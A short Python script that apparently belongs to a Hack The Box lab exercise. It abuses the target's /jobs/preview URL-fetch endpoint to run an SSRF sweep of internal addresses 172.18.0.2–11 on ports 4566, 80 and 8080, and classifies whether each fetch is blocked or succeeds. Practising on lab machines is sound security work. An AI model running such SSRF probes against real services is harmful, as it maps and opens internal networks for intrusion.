import subprocess

for i in range(2, 12):
    ip = f"172.18.0.{i}"
    for port in [4566, 80, 8080]:
        u = f"http://{ip}:{port}/x.yaml"
        r = subprocess.run(
            ["curl", "-s", "-X", "POST", "http://nimbus.htb/jobs/preview",
             "--data-urlencode", f"url={u}"],
            capture_output=True, text=True, timeout=15,
        )
        body = r.stdout
        if "Security policy" in body:
            verdict = "BLOCKED"
        elif "Could not fetch" in body:
            verdict = "CONN_FAILED"
        elif "Fetched:" in body:
            verdict = "FETCHED"
        else:
            verdict = "UNKNOWN"
        print(f"{u!r:35s} -> {verdict}")
